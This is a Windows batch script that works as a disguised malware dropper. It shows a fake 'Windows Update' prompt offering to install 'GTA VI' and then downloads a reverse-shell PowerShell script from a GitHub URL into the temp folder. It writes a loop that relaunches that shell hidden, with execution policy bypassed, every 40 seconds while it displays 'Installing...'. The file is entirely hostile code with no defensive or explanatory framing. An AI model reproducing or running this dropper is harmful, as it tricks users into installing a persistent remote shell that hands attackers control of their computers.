@echo off

:: Show a message box
powershell -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('Do you want to install GTA VI', 'Windows Update')"

:: Set the path to the temporary directory
set tempPath=%TEMP%

:: Download the reverse shell script
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Issac-dev/GlitchGhost/main/reverse_shell.ps1' -OutFile '%tempPath%\reverse_shell.ps1'"

:: Create the loop PowerShell script (loop_script.ps1)
echo $scriptPath = "$env:TEMP\reverse_shell.ps1" > "%tempPath%\loop_script.ps1"
echo while ($true^) { >> "%tempPath%\loop_script.ps1"
echo     Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File $scriptPath" -WindowStyle Hidden >> "%tempPath%\loop_script.ps1"
echo     Write-Host "Installing..." >> "%tempPath%\loop_script.ps1"
echo     Start-Sleep -Seconds 40 >> "%tempPath%\loop_script.ps1"
echo } >> "%tempPath%\loop_script.ps1"

:: Run the loop script
powershell -ExecutionPolicy Bypass -File "%tempPath%\loop_script.ps1"
